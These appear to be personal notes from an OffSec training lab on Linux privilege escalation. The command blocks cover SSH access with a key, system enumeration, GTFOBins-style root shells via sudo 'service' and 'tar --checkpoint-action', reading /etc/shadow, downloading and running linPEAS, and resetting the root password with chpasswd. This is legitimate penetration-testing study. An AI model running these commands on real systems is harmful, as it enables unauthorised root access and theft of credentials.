
https://portal.offsec.com/labs/play
```
chmod 400 id_rsa_max

ssh -i id_rsa_max max@192.168.246.78

SoSimple
```

https://gtfobins.github.io
LOL-BIN Repository

```
# identify current privs
sudo -l
# check your user/id
id
whoami
# hostname
hostname
uname -n
cat /etc/hostname
# check os
uname -a
cat /etc/issue
lsb_release -a
cat /etc/os-release
# check processes
ps aux
ps aux | grep root
htop
#check ports / internal ports can be vuln
ip a
netstat -tulpn  
netstat -an  
ss -tulpn  
ss -tupan
# running routes
ip route show
# firewall
ufw
iptables
firewall-cmd
# cronjobs
crontab -l
cat /etc/crontab
# list all installed packages
dkpg -l
apt list --installed
# find writable dirs
find / -type d -writable 2>/dev/null
find / -type f -perm -4000 2>/dev/null

```

```


chmod +x <root no pass file>.sh
```

```
sudo -u steven service --status-all
sudo -u steven service ../../bin/sh
```


Weak file permissions

```
ls -la /etc/passwd
ls -la /etc/shadow

cat /etc/shadow

# check cronjobs
# sudo sgid / suid files
# services 
# tar escalation 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

```
cat /etc/passwd | grep -v nologin | grep -v false | awk -F: '{print $1}' > users.txt
```

https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS


```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

chmod +x linpeas.sh 

./linpeas.sh > output.txt

cat output.txt | grep writable
```

```
echo "root:password123" | /sbin/chpasswd
```




